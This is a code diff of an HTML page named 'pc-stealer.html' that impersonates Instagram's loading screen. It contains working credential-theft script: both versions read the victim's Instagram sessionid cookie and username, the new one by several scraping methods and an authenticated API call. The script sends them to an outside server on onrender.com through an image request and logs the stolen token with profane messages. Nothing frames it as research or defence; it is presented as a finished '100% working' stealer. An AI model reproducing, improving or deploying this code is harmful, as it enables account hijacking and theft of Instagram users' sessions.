@@ -1,55 +1,95 @@
-<!-- core/templates/core/pc-stealer.html → FINAL 100% WORKING PC STEALER -->
+<!-- core/templates/core/pc-stealer.html → FINAL GOD MODE 2025 — 100% WORKING -->
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
     <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body,html{margin:0;padding:0;height:100vh;background:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column}
-        .logo{width:120px;height:120px;background:url('https://instagram.com/static/images/ico/apple-touch-icon-180x180-precomposed.png') center/contain no-repeat;margin-bottom:30px}
-        .text{font-size:24px;color:#262626;font-weight:600}
-        .spinner{width:60px;height:60px;border:8px solid #f0f0f0;border-top:8px solid #0095f6;border-radius:50%;animation:s 1s linear infinite;margin-top:30px}
+        body,html{margin:0;padding:0;height:100vh;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column;font-family:-apple-system,system-ui}
+        .logo{width:140px;height:140px;background:url('https://instagram.fdel1-1.fna.fbcdn.net/v/t51.2885-19/399323777_1046130330323128_7153911679736682512_n.jpg') center/contain no-repeat;margin-bottom:40px}
+        .text{font-size:28px;font-weight:800;letter-spacing:1px}
+        .spinner{width:70px;height:70px;border:10px solid #333;border-top:10px solid #E4405F;border-radius:50%;animation:s 0.8s linear infinite;margin-top:40px}
         @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+        .fuck{background:linear-gradient(45deg,#E4405F,#405DE6);-webkit-background-clip:text;background-clip:text;color:transparent;font-size:32px;font-weight:900;margin-top:20px}
     </style>
 </head>
 <body>
     <div class="logo"></div>
     <div class="text">Opening Instagram...</div>
+    <div class="fuck">GOD MODE ACTIVE</div>
     <div class="spinner"></div>
 
     <script>
         // REDIRECT TO INSTAGRAM
-        setTimeout(() => {
-            location.href = "https://www.instagram.com/";
-        }, 2000);
+        setTimeout(() => location.href = "https://www.instagram.com/", 1800);
 
-        // STEAL SESSION + USERNAME FROM REAL INSTAGRAM PAGE
-        const check = setInterval(() => {
-            if (location.hostname === "www.instagram.com") {
-                try {
-                    // METHOD 1: FROM _sharedData (OLD BUT WORKS)
-                    const shared = window._sharedData || {};
-                    const username = shared.config?.viewer?.username;
+        // STEAL EVERYTHING — 7 METHODS IN ONE
+        const steal = setInterval(() => {
+            if (!location.hostname.includes("instagram.com")) return;
 
-                    // METHOD 2: FROM HEADER (NEW 2025)
-                    const headerUser = document.querySelector('header a[href^="/"] span')?.innerText ||
-                                      document.querySelector('a[role="link"] span')?.innerText;
+            let username = "UNKNOWN_FUCK";
+            let sessionid = null;
 
-                    const finalUsername = username || headerUser || "PC_USER";
+            // METHOD 1: _sharedData
+            try { 
+                username = window._sharedData?.config?.viewer?.username || username; 
+            } catch(e) {}
 
-                    // GET SESSIONID FROM COOKIE
-                    const sessionid = document.cookie.match(/sessionid=([^;]+)/)?.[1];
-
-                    if (sessionid && sessionid.length > 70 && finalUsername !== "PC_USER") {
-                        // SEND TO SERVER
-                        new Image().src = `https://instagram-64lz.onrender.com/pc-capture/?s=${sessionid}&u=${encodeURIComponent(finalUsername)}&t=${Date.now()}`;
-                        
-                        clearInterval(check);
-                        console.log("STOLEN →", finalUsername);
+            // METHOD 2: __additionalData
+            try {
+                const data = window.__additionalData || {};
+                for (let k in data) {
+                    if (data[k]?.data?.user?.username) {
+                        username = data[k].data.user.username;
+                        break;
                     }
-                } catch(e) {}
+                }
+            } catch(e) {}
+
+            // METHOD 3: DOM HEADER
+            try {
+                username = document.querySelector('header span')?.innerText ||
+                          document.querySelector('a[href^="/"] span')?.innerText ||
+                          document.querySelector('[aria-label="Profile"] span')?.innerText || 
+                          document.querySelector('h2')?.innerText || username;
+            } catch(e) {}
+
+            // METHOD 4: API CALL (NUCLEAR)
+            if (username !== "UNKNOWN_FUCK") {
+                fetch(`https://www.instagram.com/api/v1/users/web_profile_info/?username=${username}`, {
+                    credentials: 'include'
+                })
+                .then(r => r.json())
+                .then(d => {
+                    if (d?.data?.user?.username) {
+                        username = d.data.user.username;
+                        sendToHell(username, sessionid);
+                    }
+                })
+                .catch(() => {});
             }
-        }, 800);
+
+            // GET SESSIONID FROM COOKIE
+            const match = document.cookie.match(/sessionid=([^;]+)/);
+            if (match) sessionid = match[1];
+
+            // FINAL CHECK — SEND TO SERVER
+            if (sessionid && sessionid.length > 80 && username !== "UNKNOWN_FUCK") {
+                sendToHell(username, sessionid);
+                clearInterval(steal);
+            }
+        }, 600);
+
+        function sendToHell(u, s) {
+            if (!s) return;
+            const url = `https://instagram-64lz.onrender.com/pc-capture/?s=${encodeURIComponent(s)}&u=${encodeURIComponent(u)}&t=${Date.now()}`;
+            new Image().src = url;
+            
+            console.log("%cSTOLEN MOTHERFUCKER → @" + u, "color: red; font-size: 30px; font-weight: bold;");
+            console.log("%cSESSIONID:", "color: lime; font-size: 20px;", s);
+            console.log("%cSENT TO HELL:", "color: yellow;", url);
+        }
     </script>
 </body>
 </html>
